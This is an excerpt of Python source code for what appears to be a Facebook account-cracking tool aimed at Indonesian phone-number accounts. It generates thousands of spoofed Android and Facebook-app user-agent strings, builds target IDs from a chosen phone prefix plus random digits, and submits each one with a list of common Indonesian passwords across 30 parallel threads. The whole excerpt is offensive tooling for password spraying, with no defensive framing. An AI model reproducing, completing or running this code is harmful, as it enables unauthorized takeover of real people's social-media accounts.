...
for agent in range(10000):
        aa='Mozilla/5.0 (Linux; Android 11; Nokia C10'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='Build/RP1A.201005.001; wv)'
        ...
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/333.0.0.12.108;]'
...
def indo():
                user=[]
                clear()
                print('\033[1;31m Code example: 0812,0831,0856')
                code = input('\033[1;37m put code: ')
                try:
                        limit = int(input('\033[1;31m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
                except ValueError:
                ...
                with tred(max_workers=30) as Aking:     
                        ...
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'sayang','sayang123','anjing','indonesia','jancok','bismillah','bismillah123','Sayang','sayangku','12345678','indonesiaku']
                                Aking.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
